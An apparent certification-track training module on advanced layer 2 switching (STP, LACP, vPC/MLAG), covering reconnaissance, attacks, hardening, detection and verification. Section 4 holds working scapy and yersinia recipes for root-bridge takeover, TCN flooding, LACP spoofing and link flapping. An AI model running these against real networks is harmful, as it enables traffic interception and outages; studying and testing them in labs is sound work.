# Switching Advanced

> Track: Offensive / Defensive | Level: Foundation | Certs: Network+, CCNA, CCNP

## 1. Overview

Basic switching (MAC learning, VLANs, trunking) is in the Network
Fundamentals subcategory. This file covers the advanced layer 2
topics that matter in a real data center or campus: loop
prevention (STP and its variants), link aggregation
(EtherChannel/LACP), and multi-switch virtualization (VPC, MLAG).

Three things make advanced switching worth studying in depth:

- Loops are catastrophic. A layer 2 loop without STP produces a
  broadcast storm that takes down the whole segment in seconds.
  STP is the only thing standing between a misconfigured cable
  and a network outage.
- STP is also an attack surface. A rogue switch that claims the
  root bridge pulls all traffic through itself. BPDU guard and
  root guard are the defenses, and they are opt-in.
- Link aggregation and multi-switch virtualization change the
  failure domain. An EtherChannel misconfiguration can blackhole
  half the traffic; a VPC misconfiguration can split the control
  plane.

The vocabulary: root bridge, bridge ID, port role (root,
designated, alternate, backup), port state (blocking, listening,
learning, forwarding), BPDU, TCN, RSTP, MST, EtherChannel, LACP,
PAgP, VPC, MLAG, vPC domain.

## 2. Reconnaissance / Enumeration

Switching reconnaissance is about finding the layer 2 topology:
who is the root bridge, which links are blocked, and where the
aggregated links are.

**Root bridge and STP topology:**

```bash
# Capture BPDUs (STP multicast destination)
sudo tcpdump -i eth0 -n -e 'ether dst 01:80:c2:00:00:00'

# On a managed switch, see the STP state

```

```text
show spanning-tree
show spanning-tree vlan 10
show spanning-tree root
show spanning-tree summary

```

**What the output tells you:**

- The root bridge is the switch with the lowest bridge ID
  (priority + MAC). Every other switch has one root port toward
  it.
- A port in `BLK` (blocking) or `ALTN` (alternate) state is a
  redundant path. That is the path an attacker can use to
  bypass the active topology.
- A port in `FWD` (forwarding) state is in the active topology.
  Every host on the segment can reach it.

**EtherChannel / LACP:**

```bash
# LACP runs on Ethernet (slow protocol 0x8809); capture it
sudo tcpdump -i eth0 -n -e 'ether proto 0x8809'

```

```text
show etherchannel summary
show etherchannel port-channel
show lacp neighbor
show pagp neighbor

```

**VPC / MLAG (Cisco Nexus / Arista):**

```text
show vpc
show vpc brief
show vpc consistency-parameters global
show port-channel summary

```

**What the output tells you:**

- `show vpc` on a Nexus shows the vPC domain, the peer-link
  status, and the vPC member ports. A `peer-link` down is a
  split-brain condition.
- `show etherchannel summary` shows the bundled ports and their
  state (`P` = bundled, `I` = individual, `s` = suspended). A
  suspended port is a configuration mismatch.

**From a foothold: what does this host see?**

```bash
# A host on a switch port sees BPDUs only if it is on a trunk
sudo tcpdump -i eth0 -n -e 'ether dst 01:80:c2:00:00:00'

# LACP frames from the switch to the host (rare on access ports)
sudo tcpdump -i eth0 -n -e 'ether proto 0x8809'

```

A foothold on a switch is the highest-value position in the
layer 2 topology: the attacker sees every BPDU, every LACP
frame, and every VLAN. This is why BPDU guard and root guard
(section 6) are the controls that matter.


## 3. Common Attack Vectors

Advanced switching attacks target the control protocols that keep
the layer 2 topology consistent: STP and LACP.

**STP attacks:**
- Root bridge takeover: send a BPDU with a lower bridge ID; every
  switch now routes through the attacker.
- BPDU flood: overwhelm the switch CPU with BPDUs.
- TCN flood: send topology change notifications continuously;
  every switch flushes its MAC table repeatedly, degrading
  performance.
- Rogue STP domain: a rogue switch that speaks STP on a port
  that should be access-only.

**EtherChannel / LACP attacks:**
- LACP spoofing: if the switch uses passive LACP, an attacker
  can negotiate a bundle and join the channel.
- PAgP spoofing: same, for Cisco PAgP.
- Link flapping: repeatedly bring a member link up/down to
  force reconvergence and instability.

**VPC / MLAG attacks:**
- Split-brain: if the peer-link fails and the keepalive also
  fails, both peers become active and duplicate traffic.
- Peer-link poisoning: a compromised peer-link carries the
  control plane for both switches.

**VLAN and trunk attacks** (see 01/02 for details):
- VLAN hopping via double tagging.
- Switch spoofing via DTP.
- Native VLAN abuse.

The common thread: STP and LACP are unauthenticated by default.
BPDU guard, root guard, and LACP authentication are the defenses,
and they are opt-in.

## 4. Exploitation Recipes

All commands are run only against systems you own or have written
authorization to test.

### Recipe 1 - Root bridge takeover with yersinia

Yersinia is the classic tool for layer 2 protocol attacks.

```bash
# Install yersinia on Kali
sudo apt install yersinia

# Interactive mode: choose STP, then "Claiming the Root Role"
sudo yersinia -I

```

Expected effect: the attacker switch becomes the root bridge.
Every BPDU in the segment now has the attacker bridge ID, and
all inter-switch traffic flows through it.

### Recipe 2 - Root bridge takeover with scapy

A minimal BPDU with priority 0 (lowest possible).

```bash
sudo python3 -c "
from scapy.all import *
bpdu = Ether(dst='01:80:c2:00:00:00')/LLC()/STP(bpdutype=0, rootid=0, bridgeid=0, portid=1, poll=0)
sendp(bpdu, iface='eth0', loop=1, inter=2)
"

```

Expected effect: the same as Recipe 1. The switch that receives
the lowest bridge ID elects the attacker as root.

### Recipe 3 - TCN flood (DoS)

Every TCN makes every switch flush its MAC table. Repeated TCNs
keep the table empty, so every frame is flooded.

```bash
sudo python3 -c "
from scapy.all import *
tcn = Ether(dst='01:80:c2:00:00:00')/LLC()/STP(bpdutype=0x80)
sendp(tcn, iface='eth0', loop=1, inter=1)
"

```

Expected effect: the switch MAC tables flush repeatedly. Forwarding
performance drops because every frame is flooded.

### Recipe 4 - LACP spoofing (lab only)

If the switch port is in passive LACP mode, an attacker can
negotiate a bundle.

```bash
# Send LACP frames to join the channel (requires a full LACP stack)
sudo python3 -c "
from scapy.all import *
lacp = Ether(dst='01:80:c2:00:00:02', type=0x8809)/Raw(load=b'\\x01\\x01\\x01\\x00' + b'\\x00' * 100)
sendp(lacp, iface='eth0', loop=1, inter=1)
"

```

This is a proof of concept; a real LACP stack (e.g. `libteam`
on Linux) is needed to complete the negotiation. The point: a
passive LACP port will accept an attacker as a bundle member.

### Recipe 5 - LACP link flapping (DoS)

Repeatedly bring a member link up/down to force reconvergence.

```bash
# On a Linux host with a bonded interface
sudo ip link set eth0 down; sleep 2; sudo ip link set eth0 up
# Repeat

```

Expected effect: the EtherChannel reconverges on every flap.
Traffic is briefly interrupted, and the logs fill with LACP
state changes.

All five recipes are detectable by BPDU guard, root guard, and
LACP authentication (section 6), and by STP/LACP change events
(section 7).

## 5. Post-Exploitation

Once you control the layer 2 topology, the post-exploitation
options are network-wide.

**Traffic interception at scale:** a root bridge takeover puts
every inter-switch frame through the attacker. Every VLAN, every
host, every protocol. This is a MITM without touching a single
host.

**Loop injection (DoS):** a rogue switch that does not speak STP,
or that blocks BPDUs on its uplinks, creates a loop. The loop
produces a broadcast storm and takes down the segment.

**EtherChannel hijack:** joining an EtherChannel gives the
attacker a share of the bandwidth and a position on every VLAN
in the bundle.

**VPC split-brain:** if the peer-link fails and the keepalive
fails too, both VPC peers become active. The result is duplicate
traffic, MAC flapping, and in some cases a full outage.

**Persistence:** a rogue switch configured as the root bridge
persists across reboots. It is invisible to host-based monitoring
and to most network monitoring that does not look at STP.

**Reporting:** the finding is "the layer 2 control plane accepted
an unauthenticated speaker, and the attacker became the root
bridge / joined the EtherChannel". That is a control-plane trust
failure at layer 2, and it is a critical finding. The fix is
section 6: BPDU guard, root guard, loop guard, and LACP
authentication.


## 6. Preventive Controls

Switching defense is about protecting the control protocols on
the ports where they should run, and blocking them everywhere
else.

**BPDU guard (access ports):**

```text
interface range GigabitEthernet0/1-48
 spanning-tree bpduguard enable

! Global default for all access ports
spanning-tree portfast bpduguard default

```

An access port should never receive a BPDU. If it does, a switch
is connected where a host should be. BPDU guard err-disables the
port.

**Root guard (uplink ports):**

```text
interface GigabitEthernet0/49
 spanning-tree guard root

```

Root guard prevents a downstream switch from becoming the root
bridge. If a superior BPDU arrives, the port goes to root-inconsistent
state.

**Loop guard (fiber / unidirectional links):**

```text
interface GigabitEthernet0/49
 spanning-tree guard loop

```

Loop guard prevents a blocked port from moving to forwarding when
BPDUs stop arriving (a unidirectional link failure).

**BPDU filter (host ports, with caution):**

```text
interface range GigabitEthernet0/1-48
 spanning-tree bpdufilter enable

```

BPDU filter stops sending and receiving BPDUs on a port. It is
dangerous on uplinks (creates loops) and only safe on host ports
that also have BPDU guard.

**LACP authentication (link aggregation):**

```text
! LACP does not have native authentication; use a shared key
! with 802.1X or MACsec for the link, or a static channel-group
interface range GigabitEthernet0/1-2
 channel-group 1 mode active
 lacp rate fast

! Prefer static EtherChannel when the peer is known
interface range GigabitEthernet0/1-2
 channel-group 1 mode on

```

Static EtherChannel (`mode on`) does not negotiate, so there is
nothing for an attacker to spoof. The trade-off is that a
misconfiguration is silent. Use LACP with 802.1X/MACsec where
possible.

**STP mode selection:**

```text
! RSTP for fast convergence
spanning-tree mode rapid-pvst

! MST for multiple VLANs per instance (large networks)
spanning-tree mode mst
spanning-tree mst configuration
 name CORP
 revision 1
 instance 1 vlan 10-20
 instance 2 vlan 30-40

```

RSTP converges in seconds (vs 30-50s for 802.1D). MST lets you
map many VLANs to a few instances, which scales better.

**VPC / MLAG hardening:**

```text
! Cisco Nexus vPC
vpc domain 1
 peer-keepalive destination 10.10.10.2 source 10.10.10.1
 peer-gateway
 auto-recovery reload-delay 240
 delay restore interface-vlan 60

! Arista MLAG
mlag configuration
 domain-id CORP
 local-interface Vlan4094
 peer-address 10.10.10.2
 peer-link Port-Channel1
 reload-delay 300

```

The peer-keepalive must be on a separate path from the peer-link.
If both fail together, the pair goes split-brain. Auto-recovery
with a reload-delay is the standard mitigation.

**Disable unused features on access ports:**

```text
interface range GigabitEthernet0/1-48
 switchport mode access
 switchport nonegotiate
 spanning-tree portfast
 spanning-tree bpduguard enable
 no cdp enable
 no lldp transmit
 no lldp receive

```

Every protocol enabled on an access port is an attack surface.
DTP, CDP, and LLDP all leak information. Disable them where they
are not needed.

## 7. Detection Controls

Each attack in section 3 has a matching detection.

**STP detection:**
- BPDU received on an access port (BPDU guard log).
- Root bridge change (a new root with an unexpected bridge ID).
- TCN rate anomaly (TCN flood).
- Topology change notifications in bursts.

**LACP detection:**
- New LACP neighbor on a port that should be static.
- LACP state change events in bursts (link flapping).
- EtherChannel member port suspended (configuration mismatch).

**VPC / MLAG detection:**
- Peer-link down (split-brain condition).
- Peer-keepalive down while peer-link is up (keepalive failure).
- vPC member port inconsistency.

**Control-plane logging:**

```text
! STP events
spanning-tree logging

! BPDU guard events
! (part of spanning-tree logging; look for "BPDUGUARD" in syslog)

! EtherChannel events
! (part of the interface logging; look for "LACP" in syslog)

! Syslog to a central collector
logging host 10.10.10.50
logging trap informational

```

**SIEM correlation:** the high-value alert is "BPDU on access port
+ new root bridge + MAC table flush". Each event alone is noise;
together they are a layer 2 control-plane compromise.

## 8. Verification

How to verify that the switching defenses are working.

**Verify BPDU guard:**

```bash
# From a test host, send a BPDU on an access port
sudo python3 -c "from scapy.all import *; sendp(Ether(dst='01:80:c2:00:00:00')/LLC()/STP(bpdutype=0), iface='eth0')"
# Expect: the port err-disables within 1-2 seconds

```

**Verify root guard:**

```bash
# From a downstream switch, send a superior BPDU on the uplink
sudo python3 -c "from scapy.all import *; sendp(Ether(dst='01:80:c2:00:00:00')/LLC()/STP(bpdutype=0, rootid=0, bridgeid=0), iface='eth0')"
# Expect: the uplink goes to root-inconsistent state, no root change

```

**Verify LACP:**

```text
show etherchannel summary
! Expect: all member ports in state P (bundled), none in I (individual) or s (suspended)
show lacp neighbor
! Expect: only the expected peers, with the expected system ID

```

**Verify VPC / MLAG:**

```text
show vpc
! Expect: vPC domain up, peer-link up, peer-keepalive up
! Expect: all vPC member ports up, no inconsistency

```

**The verification habit:** after every switching change, re-check
who is the root bridge, which ports are forwarding vs blocking,
and whether the EtherChannel/VPC state matches the design. A
silent STP change is the most common layer 2 failure.

## 9. Certification Alignment

**CompTIA Network+ (N10-009):**
- Domain 2: Network Implementation - STP, EtherChannel, VLANs.
- Domain 4: Network Security - BPDU guard, root guard,
  first-hop security.

**Cisco CCNA (200-301):**
- Domain 2: Network Access - STP (PVST+, Rapid PVST+, MST),
  EtherChannel (LACP, PAgP), switch stacking.
- Domain 5: Security Fundamentals - port security, BPDU guard,
  root guard.

**Cisco CCNP Enterprise (350-401 ENCOR):**
- Advanced STP, MST, VPC, MLAG, FabricPath / VXLAN EVPN.
- LACP and EtherChannel troubleshooting.

**Juniper JNCIA (JN0-105):**
- RSTP, MSTP, LACP, and Junos configuration for the same concepts.

**Cross-references:**
- 01 Network Fundamentals covers the basic VLAN and STP concepts
  this file builds on.
- 01 Routing Fundamentals and 02 Dynamic Routing Protocols cover
  the layer 3 protocols that run on top of this fabric.
- 04 Routing Attacks and 05 Routing Defense cover the layer 3
  attacks and defenses.

## 10. Production Notes

**STP is a single point of failure, and it is silent.** A
misconfigured STP can take 30 seconds to converge (802.1D) or
fail to converge at all. RSTP is the default on modern switches
for a reason. If you are still running 802.1D, migrate.

**BPDU guard is not optional on access ports.** Every access port
that does not have BPDU guard is a port where a rogue switch can
join the topology and become the root bridge. This is the single
highest-value layer 2 control, and it is one line per port.

**EtherChannel static vs LACP.** Static (`mode on`) is faster and
has no negotiation to spoof, but a misconfiguration is silent
(one side bundles, the other does not). LACP negotiates, which
catches misconfiguration, but the negotiation itself is the
attack surface. Choose based on your operational maturity.

**VPC / MLAG is a dual-edge sword.** It eliminates STP on the
server side (both peers forward), which improves convergence and
bandwidth. But the peer-link and peer-keepalive are now critical
infrastructure: if both fail, the pair splits and duplicates
traffic. Treat the peer-link as a production link, not a
management link.

**Layer 2 is where the blast radius is largest.** A layer 3
compromise is contained by routing policy; a layer 2 compromise
is contained by nothing unless segmentation exists. This is why
the segmentation controls in 01 Network Fundamentals and the
switching controls in this file are complementary, not optional.

## 11. References

- IEEE 802.1D - Media Access Control (MAC) Bridges (STP) - https://standards.ieee.org/ieee/802.1D/6234/
- IEEE 802.1w - Rapid Reconfiguration of Spanning Tree (RSTP) - https://standards.ieee.org/ieee/802.1w/6235/
- IEEE 802.1s - Multiple Spanning Trees (MSTP) - https://standards.ieee.org/ieee/802.1s/6236/
- IEEE 802.3ad - Link Aggregation (LACP) - https://standards.ieee.org/ieee/802.3ad/1031/
- IEEE 802.1AX - Link Aggregation (supersedes 802.3ad) - https://standards.ieee.org/ieee/802.1AX/7343/
- Cisco - Spanning Tree Protocol (STP) Configuration Guide - https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst9300/software/release/17-9/configuration_guide/lyr2/b_179_lyr2_9300_cg/configuring_spanning_tree_protocol.html
- Cisco - Nexus 9000 vPC Configuration Guide - https://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus9000/sw/93x/vpc/b-cisco-nexus-9000-series-nx-os-vpc-configuration-guide-93x.html
- Arista - MLAG Configuration Guide - https://www.arista.com/en/um-eos/eos-multi-chassis-lag
- NIST SP 800-41 Rev. 1 - Guidelines on Firewalls and Firewall Policy - https://csrc.nist.gov/pubs/sp/800/41/r1/final
- CompTIA Network+ exam objectives - https://www.comptia.org/certifications/network
- Cisco CCNA exam topics - https://learningnetwork.cisco.com/s/ccna-exam-topics

